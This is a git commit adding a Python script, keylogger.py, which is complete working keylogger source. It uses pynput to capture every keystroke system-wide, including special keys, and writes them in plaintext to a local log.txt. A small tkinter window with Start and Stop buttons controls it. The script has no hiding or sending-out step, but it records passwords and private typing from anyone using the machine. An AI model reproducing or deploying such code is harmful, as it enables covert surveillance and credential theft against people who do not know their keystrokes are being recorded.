9993c25a8038bc89c1af3e738d48698a5fa04dec
Shivendra <116360835+Shivendra-Chouksey@users.noreply.github.com>
2023-07-24 17:37:47 +0530

    Initial Commit

---
+++ keylogger.py
@@ -0,0 +1,53 @@
+from pynput import keyboard
+import tkinter as tk
+# SHIVENDRA CHOUKSEY
+# email :- shivenchouksey222@gmail.com
+keylogger_listener = None  # Global variable to store the keylogger listener instance
+
+def on_press(key):
+    try:
+        key_char = key.char
+        with open('log.txt', 'a') as file:
+            file.write(key_char + '\n')
+    except AttributeError:
+        # Special key encountered, add it to the log file
+        key_name = str(key).replace("Key.", "<") + ">"
+        with open('log.txt', 'a') as file:
+            file.write(key_name + '\n')
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        # Stop listener on pressing the 'esc' key
+        return False
+
+def start_keylogger():
+    global keylogger_listener
+    # Start the keylogger
+    keylogger_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+    keylogger_listener.start()
+
+def stop_keylogger():
+    global keylogger_listener
+    # Stop the keylogger
+    if keylogger_listener:
+        keylogger_listener.stop()
+        keylogger_listener = None
+
+# Create a simple GUI
+window = tk.Tk()
+window.title("Keylogger")
+window.geometry("300x150")
+
+window.configure(bg="yellow")
+heading_label = tk.Label(window, text="Keylogger-By Shivendra", font=("Arial", 10), fg="black", bg="yellow")
+heading_label.config(highlightthickness=0)
+heading_label.pack(pady=20)
+
+
+start_button = tk.Button(window, text="Start Keylogger", command=start_keylogger)
+start_button.pack(pady=10)
+
+stop_button = tk.Button(window, text="Stop Keylogger", command=stop_keylogger)
+stop_button.pack(pady=10)
+
+window.mainloop()
